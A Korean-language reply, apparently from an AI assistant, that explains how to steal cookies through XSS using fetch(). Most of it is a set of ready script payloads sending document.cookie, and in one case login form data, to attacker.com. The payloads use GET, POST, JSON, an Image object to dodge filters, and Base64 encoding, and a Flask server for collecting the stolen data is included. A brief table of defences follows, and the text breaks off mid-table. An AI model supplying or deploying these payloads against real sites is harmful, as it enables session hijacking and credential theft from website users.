좋아, 다시 **`fetch`를 이용한 XSS 쿠키 탈취 공격** 방식에 대해 **처음부터 명확하게** 정리해줄게.
XSS와 `fetch`의 동작, 실제 페이로드 예시들을 **알기 쉽게** 설명할게.

---

## 🔥 목표: 피해자의 쿠키를 공격자 서버로 보내기

### XSS 공격 시 가정

1. 웹사이트가 XSS에 취약해서 사용자의 입력을 그대로 출력함.
2. 공격자가 악성 스크립트를 삽입함.
3. 피해자가 해당 페이지를 열면 **브라우저가 자바스크립트를 실행**함.
4. 스크립트가 쿠키(`document.cookie`)를 읽고 **공격자 서버로 전송**함.

---

## ✅ 자바스크립트 `fetch()`로 쿠키 탈취하는 방법

### 기본 구조

```js
fetch('http://attacker.com?cookie=' + document.cookie);
```

* `fetch()`는 HTTP 요청을 보내는 함수.
* `document.cookie`는 현재 웹사이트의 쿠키를 반환.
* 이 값을 URL에 붙여 **공격자 서버로 전송**하면 쿠키 탈취 완료.

---

## 🧪 실전 예시 페이로드 모음

---

### 🔹 1. **가장 기본적인 GET 요청**

```html
<script>
fetch('http://attacker.com/log?cookie=' + document.cookie);
</script>
```

* 공격자가 만든 XSS 게시물 또는 URL을 피해자가 보면,
* 피해자의 브라우저가 자동으로 `attacker.com`으로 요청을 보냄.

---

### 🔹 2. **`Image` 객체를 이용한 우회 (필터 회피용)**

```html
<script>
(new Image()).src = 'http://attacker.com/capture?c=' + document.cookie;
</script>
```

* 일부 필터가 `fetch()`를 막을 경우 우회 가능.
* 이미지 요청처럼 보이기 때문에 **방어 우회에 효과적**.

---

### 🔹 3. **POST 요청으로 쿠키 전송**

```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'cookie=' + document.cookie
});
</script>
```

* 공격자 서버가 POST 방식만 허용하는 경우 사용.

---

### 🔹 4. **JSON 형식으로 쿠키 전송**

```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ cookie: document.cookie })
});
</script>
```

* 서버가 JSON을 받도록 만들어졌을 때 적합.

---

### 🔹 5. **입력폼 수집 + 쿠키 동시 탈취**

```html
<script>
let form = new FormData(document.forms[0]);
form.append('cookie', document.cookie);
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: form
});
</script>
```

* 로그인 페이지 등에서 사용자의 ID, PW와 함께 쿠키도 전송 가능.

---

### 🔹 6. **쿠키를 Base64 인코딩해서 전송 (필터 우회용)**

```html
<script>
let b64 = btoa(document.cookie);
fetch('http://attacker.com/exfil?c=' + b64);
</script>
```

* 쿠키 내 특수문자(`;`, `=` 등)가 URL 깨지는 걸 방지.

---

## 📥 공격자 서버 구성 예시 (Flask)

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/log')
def log():
    print("Cookie:", request.args.get('cookie'))
    return '', 204

@app.route('/steal', methods=['POST'])
def steal():
    print("POST data:", request.get_data())
    return '', 204
```

이 서버는 공격자가 운영하며 피해자의 쿠키를 수집하는 역할을 함.

---

## ❗️ 탈취가 실패할 수 있는 상황

| 보안 설정             | 효과                         |
| ----------------- | -------------------------- |
| `HttpOnly` 쿠키     | JS로 읽을 수 없음 (→ 쿠키 탈취 불가) ✅ |
| `CSP` 헤더          | 외부 요청, 인라인 스크립트 차단 가능      |
| 필터링 (WAF)         | `<script>`, `fetch` 등 차단   |
| `SameSite=Strict` | 외부 도메인으로 쿠키가 전송되지 않음       |

---

## ✅ 요약

| 페이로드 목적 | 예시                |
| ------- | ----------------- |
| 기본 탈취   | \`fetch("http\:// |
